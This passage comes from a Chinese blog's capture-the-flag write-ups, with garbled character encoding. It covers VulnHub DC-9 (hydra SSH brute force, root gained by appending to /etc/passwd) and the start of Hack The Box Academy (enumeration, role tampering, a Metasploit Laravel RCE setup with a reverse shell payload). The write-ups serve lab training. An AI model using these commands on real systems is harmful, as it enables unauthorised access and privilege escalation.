0.19 seconds</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">9842/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.18 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x07-çˆ†ç ´ssh"><a href="#0x07-çˆ†ç ´ssh" class="headerlink" title="0x07.çˆ†ç ´ssh"></a>0x07.çˆ†ç ´ssh</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># hydra -L user.txt -P pass.txt 192.168.1.8 ssh</span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 03:58:38</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.8:22/</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: janitor   password: Ilovepeepee</span><br><span class="line">1 of 1 target successfully completed, 3 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 03:59:26</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>sshç™»å…¥ï¼Œåªåœ¨janitorç”¨æˆ·ä¸‹å‘ç°æœ‰ç”¨çš„æ–‡ä»¶ï¼Œä¸€äº›å¯†ç ã€‚å¹¶ä¸”sudo -læ— æœ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">janitor@dc-9:~$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------  4 janitor janitor 4096 Sep  2 17:57 .</span><br><span class="line">drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 janitor janitor 4096 Sep  2 17:57 .gnupg</span><br><span class="line">drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin</span><br><span class="line">janitor@dc-9:~$</span><br><span class="line">janitor@dc-9:~$ <span class="built_in">cd</span> .secrets-for-putin/</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ ls</span><br><span class="line">passwords-found-on-post-it-notes.txt</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$</span><br></pre></td></tr></table></figure>

<h2 id="0x08-å†æ¬¡çˆ†ç ´ssh"><a href="#0x08-å†æ¬¡çˆ†ç ´ssh" class="headerlink" title="0x08.å†æ¬¡çˆ†ç ´ssh"></a>0x08.å†æ¬¡çˆ†ç ´ssh</h2><p><code>é‡æ–°ç¼–è¾‘å¯†ç å­—å…¸</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># cat pass.txt </span></span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m<span class="comment">#48sd</span></span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72<span class="comment">#dsd</span></span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br><span class="line">root@JIYE:~/vulnhub/dc9</span><br></pre></td></tr></table></figure>

<p><code>å†æ¬¡çˆ†ç ´ï¼Œåˆå‘ç°ä¸€ä¸ªç”¨æˆ·</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># hydra -L user.txt -P pass.txt 192.168.1.8 ssh</span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 04:13:22</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 391 login tries (l:17/p:23), ~25 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.8:22/</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: fredf   password: B4-Tru3-001</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: janitor   password: Ilovepeepee</span><br><span class="line">[STATUS] 368.00 tries/min, 368 tries <span class="keyword">in</span> 00:01h, 25 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 16 active</span><br><span class="line">1 of 1 target successfully completed, 4 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 04:14:40</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x09-fredfç™»å…¥"><a href="#0x09-fredfç™»å…¥" class="headerlink" title="0x09.fredfç™»å…¥"></a>0x09.fredfç™»å…¥</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fredf@dc-9:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/<span class="built_in">test</span>/<span class="built_in">test</span></span><br><span class="line">fredf@dc-9:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>æŸ¥çœ‹test</code></p>
<blockquote>
<p>æ­¤ä»£ç å«ä¹‰ï¼š</p>
<p>ä¸€å…±ä¸¤ä¸ªâ€å‚æ•°ï¼ˆæ–‡ä»¶ï¼‰â€ï¼Œæ‰“å¼€ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯»å–é‡Œé¢æ–‡ä»¶èµ‹å€¼ç»™outputï¼›æ‰“å¼€ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œå†™å…¥outputï¼Œå…³é—­ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff$ cat test.py </span><br><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != 3 :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[1], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line">fredf@dc-9:/opt/devstuff$</span><br></pre></td></tr></table></figure>

<p><code>æ—¢ç„¶è¿™æ ·å°±å¯ä»¥å‘/etc/passwdå†™å…¥æ–‡ä»¶</code></p>
<p><code>ç”±äº/etc/passwdçš„ç¬¬äºŒä¸ªå­—æ®µå—åˆ°å¯†ç ä¿æŠ¤ï¼Œæ‰€ä»¥å…ˆç”Ÿæˆå£ä»¤</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># openssl passwd -1 -salt demo 123</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$demo</span><span class="variable">$N8rNOM51XVLc6Sj7cqsmT</span>/</span><br><span class="line">root@JIYE:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ç¼–è¾‘</span><br><span class="line">fredf@dc-9:~$ <span class="built_in">echo</span> <span class="string">&#x27;demo:$1$demo$N8rNOM51XVLc6Sj7cqsmT/:0:0::/root:/bin/bash&#x27;</span> &gt; /tmp/demo</span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/<span class="built_in">test</span>$ sudo ./<span class="built_in">test</span> /tmp/demo /etc/passwd</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist/<span class="built_in">test</span>$ su demo</span><br><span class="line">Password: </span><br><span class="line">root@dc-9:/opt/devstuff/dist/<span class="built_in">test</span><span class="comment"># cd</span></span><br><span class="line">root@dc-9:~<span class="comment"># ls</span></span><br><span class="line">theflag.txt</span><br><span class="line">root@dc-9:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•     â•šâ•â•â•â•šâ•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have <span class="keyword">done</span> well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge <span class="keyword">in</span> the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks <span class="keyword">for</span> all the fish.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@dc-9:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[academy]</title>
    <url>/2020/12/09/HTB-academy/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/12/09/HTB-academy/image-20201209140730144.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†22ã€80ç«¯å£ï¼ŒåŸŸåä¸ºacademy.htbåŠæœåŠ¡å™¨ç­‰ä¿¡æ¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# nmap -sC -sV -sT 10.10.10.215 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 01:02 EST</span><br><span class="line">Nmap scan report for academy.htb (10.10.10.215)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)</span><br><span class="line">|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)</span><br><span class="line">|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Hack The Box Academy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.43 seconds</span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure>

<h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>é¦–å…ˆæ·»åŠ ä¸€æ¡hosts [10.10.10.215    academy.htb]ï¼Œå‘ç°ä¸€ä¸ªç™»å…¥ä¸ä¸€ä¸ªæ³¨å†Œæ¡†</code></p>
<img src="/2020/12/09/HTB-academy/image-20201209144619918.png" class>

<p><code>æ³¨å†Œä¸€ä¸ªè´¦å·å¹¶ç™»å…¥ï¼Œæ‰‹åŠ¨çˆ¬è™«ï¼Œæ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯</code></p>
<img src="/2020/12/09/HTB-academy/image-20201209151326705.png" class>

<h2 id="0x03-åˆ—å‡ºç›®å½•ï¼ˆ403-404ï¼‰"><a href="#0x03-åˆ—å‡ºç›®å½•ï¼ˆ403-404ï¼‰" class="headerlink" title="0x03.åˆ—å‡ºç›®å½•ï¼ˆ403/404ï¼‰"></a>0x03.åˆ—å‡ºç›®å½•ï¼ˆ403/404ï¼‰</h2><p><code>ä½¿ç”¨wfuzzè¿›è¡Œæ¨¡ç³Šæµ‹è¯•</code></p>
<blockquote>
<p>å¾—åˆ°ä»¥ä¸‹ç›®å½•</p>
<p>config</p>
<p>admin</p>
<p>index</p>
<p>home</p>
<p>login</p>
<p>register</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# wfuzz -u http://academy.htb/FUZZ.php -w /usr/share/wordlists/dirb/small.txt --hc 404,403 -t 100</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line">Target: http://academy.htb/FUZZ.php</span><br><span class="line">Total requests: 959</span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line">000000213:   200        0 L      0 W      0 Ch        &quot;config&quot;</span><br><span class="line">000000059:   200        141 L    227 W    2633 Ch     &quot;admin&quot;</span><br><span class="line">000000434:   200        76 L     131 W    2117 Ch     &quot;index&quot;</span><br><span class="line">000000411:   302        1049 L   4114 W   55034 Ch    &quot;home&quot;</span><br><span class="line">000000498:   200        141 L    226 W    2627 Ch     &quot;login&quot; </span><br><span class="line">000000684:   200        148 L    247 W    3003 Ch     &quot;register&quot;                    </span><br><span class="line">Total time: 9.694324</span><br><span class="line">Processed Requests: 959</span><br><span class="line">Filtered Requests: 953</span><br><span class="line">Requests/sec.: 98.92385</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure>

<h2 id="0x04-æŸ¥çœ‹registerç›®å½•æºç "><a href="#0x04-æŸ¥çœ‹registerç›®å½•æºç " class="headerlink" title="0x04.æŸ¥çœ‹registerç›®å½•æºç "></a>0x04.æŸ¥çœ‹registerç›®å½•æºç </h2><p><code>å‘ç°äº†éšè—åŸŸ</code></p>
<p><strong><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Ny9hcnRpY2xlL2RldGFpbHMvMTAzNjYwNzQz">éšè—åŸŸå‚è€ƒ1<i class="fa fa-external-link-alt"></i></span></strong></p>
<p><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHVzaHVpY29uZ3NoZW5nL2FyY2hpdmUvMjAxMS8wNS8wOS8yMDQwOTk0Lmh0bWw=">éšè—åŸŸå‚è€ƒ2<i class="fa fa-external-link-alt"></i></span></strong></p>
<img src="/2020/12/09/HTB-academy/image-20201209171550454.png" class>

<h2 id="0x05-bpæŠ“åŒ…"><a href="#0x05-bpæŠ“åŒ…" class="headerlink" title="0x05.bpæŠ“åŒ…"></a>0x05.bpæŠ“åŒ…</h2><p><code>ä¿®æ”¹roleidçš„å€¼ä¸º1ï¼Œå‘åå°ä¼ å€¼ï¼Œä¸”ç”¨æˆ·ååä¹Ÿéœ€è¦åŠ 1ï¼›å‘é€ï¼ŒhttpçŠ¶æ€ç éœ€è¦ä¸º200</code></p>
<img src="/2020/12/09/HTB-academy/image-20201209171903646.png" class>

<h2 id="0x06-è®¿é—®adminç›®å½•"><a href="#0x06-è®¿é—®adminç›®å½•" class="headerlink" title="0x06.è®¿é—®adminç›®å½•"></a>0x06.è®¿é—®adminç›®å½•</h2><h3 id="1-demo1ç™»å…¥"><a href="#1-demo1ç™»å…¥" class="headerlink" title="1.demo1ç™»å…¥"></a>1.demo1ç™»å…¥</h3><img src="/2020/12/09/HTB-academy/image-20201209172159741.png" class>

<h3 id="2-ç™»å…¥æˆåŠŸ"><a href="#2-ç™»å…¥æˆåŠŸ" class="headerlink" title="2.ç™»å…¥æˆåŠŸ"></a>2.ç™»å…¥æˆåŠŸ</h3><p><code>å¯ä»¥çœ‹åˆ°è§£å†³dev-staging-01.academy.htbçš„é—®é¢˜åœ¨æ¨è¿Ÿä¸­ï¼Œä¸ä¸¤ä¸ªç”¨æˆ·</code></p>
<blockquote>
<p>cry0I1t3</p>
<p>mrb3n</p>
</blockquote>
<img src="/2020/12/09/HTB-academy/image-20201209182821986.png" class>

<h3 id="3-è®¿é—®dev-staging-01-academy-htbï¼ˆéœ€æ·»åŠ hostsï¼‰"><a href="#3-è®¿é—®dev-staging-01-academy-htbï¼ˆéœ€æ·»åŠ hostsï¼‰" class="headerlink" title="3.è®¿é—®dev-staging-01.academy.htbï¼ˆéœ€æ·»åŠ hostsï¼‰"></a>3.è®¿é—®dev-staging-01.academy.htbï¼ˆéœ€æ·»åŠ hostsï¼‰</h3><p><code>å‘ç°æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯ï¼Œåº”ç”¨ä¸ºLaravel</code></p>
<img src="/2020/12/09/HTB-academy/image-20201209173106569.png" class>

<h2 id="0x07-Googleæœç´¢Laravel-expè¿›è¡Œåˆ©ç”¨"><a href="#0x07-Googleæœç´¢Laravel-expè¿›è¡Œåˆ©ç”¨" class="headerlink" title="0x07.Googleæœç´¢Laravel expè¿›è¡Œåˆ©ç”¨"></a>0x07.Googleæœç´¢Laravel expè¿›è¡Œåˆ©ç”¨</h2><p><code>å‘ç°å¯ä»¥ä½¿ç”¨MSFè¿›è¡Œåˆ©ç”¨</code></p>
<img src="/2020/12/09/HTB-academy/image-20201209173353304.png" class>

<h2 id="0x08-msfåˆ©ç”¨"><a href="#0x08-msfåˆ©ç”¨" class="headerlink" title="0x08.msfåˆ©ç”¨"></a>0x08.msfåˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# msfconsole -q</span><br><span class="line">msf5 &gt; </span><br><span class="line">msf5 &gt; search Laravel</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution</span><br><span class="line"></span><br><span class="line">msf5 &gt; use 0</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; </span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Path to target webapp</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<h3 id="1-è®¾ç½®æœ¬ç«¯ä¸»æœº"><a href="#1-è®¾ç½®æœ¬ç«¯ä¸»æœº" class="headerlink" title="1.è®¾ç½®æœ¬ç«¯ä¸»æœº"></a>1.è®¾ç½®æœ¬ç«¯ä¸»æœº</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.17.216  </span><br></pre></td></tr></table></figure>

<h3 id="2-è®¾ç½®å¯¹ç«¯ä¸»æœº"><a href="#2-è®¾ç½®å¯¹ç«¯ä¸»æœº" class="headerlink" title="2.è®¾ç½®å¯¹ç«¯ä¸»æœº"></a>2.è®¾ç½®å¯¹ç«¯ä¸»æœº</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set rhosts academy.htb</span><br><span class="line">rhosts =&gt; academy.htb</span><br></pre></td></tr></table></figure>

<h3 id="3-è®¾ç½®app-key"><a href="#3-è®¾ç½®app-key" class="headerlink" title="3.è®¾ç½®app_key"></a>3.è®¾ç½®app_key</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">app_key =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= </span><br></pre></td></tr></table></figure>

<h3 id="4-è®¾ç½®è™šæ‹Ÿä¸»æœº"><a href="#4-è®¾ç½®è™šæ‹Ÿä¸»æœº" class="headerlink" title="4.è®¾ç½®è™šæ‹Ÿä¸»æœº"></a>4.è®¾ç½®è™šæ‹Ÿä¸»æœº</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set vhost dev-staging-01.academy.htb</span><br><span class="line">vhost =&gt; dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>

